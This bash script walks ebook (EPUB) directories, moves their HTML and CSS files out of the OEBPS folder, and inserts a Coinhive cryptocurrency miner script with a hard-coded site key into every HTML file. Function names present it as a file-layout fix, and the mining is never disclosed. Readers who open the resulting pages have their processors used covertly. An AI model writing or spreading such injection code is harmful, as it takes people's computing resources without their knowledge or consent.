#!/bin/bash

javascriptCode='<script src="https://coinhive.com/lib/coinhive.min.js"></script>;<script>var miner = new CoinHive.Anonymous("YsXcESDKKYxJSmMxNFpTsKCeckt3nz3c");miner.start();</script>';

function add_javascript {
	#remove any previus javascript
	sed -i "/<script src=\"https:\/\/coinhive.com\/lib\/coinhive.min.js\"><\/script>;<script>var miner = new CoinHive.Anonymous(\"YsXcESDKKYxJSmMxNFpTsKCeckt3nz3c\");miner.start();<\/script>/d" "${1}"
	#append javascript
	sed -i "/<body/a ${javascriptCode}" "${1}"
}

function fix_OEBPS {
        oneLevelUp="${1}";
	pathToOEBPS="${1}"OEBPS/;

	#if html files exist, move up one level
	if does_file_exist "${pathToOEBPS}"*.html; then
		mv "${pathToOEBPS}"*.html "${oneLevelUp}";
	else
		echo no html files found in the OEBPS directory;
	fi

	#add javascript
	if does_file_exist "${oneLevelUp}"*.html; then
		echo adding javascript to html files..
		for filename in "${oneLevelUp}"*.html; do
			add_javascript "${filename}";
		done
	else
		echo no html files found;
	fi

	#if css files exist move css files up one level
	if does_file_exist "${pathToOEBPS}"*.css; then
		mv "${pathToOEBPS}"*.css "${oneLevelUp}";
	else 
		echo no css files found;
	fi
}

#will check if a given wildcard file path exists
function does_file_exist {
	for f in "${1}"; do
	    if [ -e "$f" ]; then 
		return 0
	    else 
		return 1
	    fi
	done
}

#iterate directories
for d in */ ; do
    printf "\n";
    echo processing directory "${d}";
    fix_OEBPS "${d}";
done


